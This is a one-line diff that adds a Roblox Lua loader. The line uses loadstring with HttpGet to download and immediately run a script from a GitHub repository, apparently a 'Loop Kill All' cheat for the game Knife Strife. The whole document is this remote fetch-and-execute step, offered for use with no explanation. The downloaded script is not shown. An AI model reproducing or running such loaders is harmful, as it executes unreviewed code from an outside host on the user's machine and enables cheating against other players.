@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/R1zve/Roblox-Scripts/main/Knife%20Strife/Loop%20Kill%20All.lua'))()
